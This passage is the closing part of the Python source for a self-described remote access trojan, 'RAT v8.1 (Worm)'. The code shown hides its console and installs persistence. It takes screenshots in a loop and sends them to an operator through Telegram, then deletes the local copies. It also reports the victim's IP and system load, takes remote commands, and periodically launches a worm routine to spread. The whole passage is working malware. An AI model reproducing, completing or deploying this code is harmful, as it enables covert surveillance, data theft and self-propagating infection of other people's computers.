            time.sleep(POLL_INTERVAL)
        except Exception as e:
            errors += 1
            _connection_quality = max(0, _connection_quality - 20)
            time.sleep(30 if errors > 5 else POLL_INTERVAL)

# ═══════════════════════════ BACKGROUND ═══════════════════════════
def background_loop():
    global _start_time, _emergency_activated, _connection_quality, _worm_enabled, _worm_interval_minutes
    _start_time = time.time()
    counter = 0
    last_heartbeat = time.time()
    last_worm = time.time()
    while True:
        if check_emergency_file() and not _emergency_activated:
            _emergency_activated = True
            tg_send_msg("Emergency file detected. Use /resume.")
        time.sleep(SLEEP_INTERVAL)
        if _emergency_activated:
            continue
        counter += 1
        ss = take_screenshot()
        if ss:
            store_data("screenshot", file_path=ss)
        if counter % 5 == 0:
            try:
                conn = sqlite3.connect(DB_PATH, timeout=5)
                cur = conn.cursor()
                cur.execute("SELECT id, file_path FROM collected_data WHERE sent=0 AND data_type='screenshot' LIMIT 3")
                for id_, fpath in cur.fetchall():
                    if fpath and os.path.exists(fpath):
                        tg_send_photo(fpath, f"Auto #{id_}")
                        try:
                            os.remove(fpath)
                        except:
                            pass
                    cur.execute("UPDATE collected_data SET sent=1 WHERE id=?", (id_,))
                conn.commit()
                conn.close()
            except:
                pass
        if time.time() - last_heartbeat > HEARTBEAT_INTERVAL:
            last_heartbeat = time.time()
            ip = get_ip_info()
            tg_send_msg(f"Heartbeat | {ip.get('public_ip','?')} | CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}% | Signal: {_connection_quality}%")
        if _worm_enabled and (time.time() - last_worm > (_worm_interval_minutes * 60)):
            last_worm = time.time()
            threading.Thread(target=worm_spread, daemon=True).start()

# ═══════════════════════════ MAIN ═══════════════════════════
def main():
    global _start_time, _emergency_activated
    _start_time = time.time()
    hide_console()
    init_db()
    if check_emergency_file():
        _emergency_activated = True
        tg_send_msg("Previous emergency detected. Use /resume.")
    else:
        if not os.path.exists(INSTALL_FLAG):
            with open(INSTALL_FLAG,"w") as f:
                f.write(datetime.now().isoformat())
            send_branded_startup()
            try:
                cmd_persistence()
            except:
                pass
        else:
            tg_send_msg("RAT v8.1 (Worm) Reconnected — /help for commands")
    t = threading.Thread(target=poll_commands, daemon=True)
    t.start()
    background_loop()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        try:
            tg_send_msg(f"Fatal: {str(e)[:300]}")
        except:
            pass
        time.sleep(60)
        try:
            main()
        except:
            pass
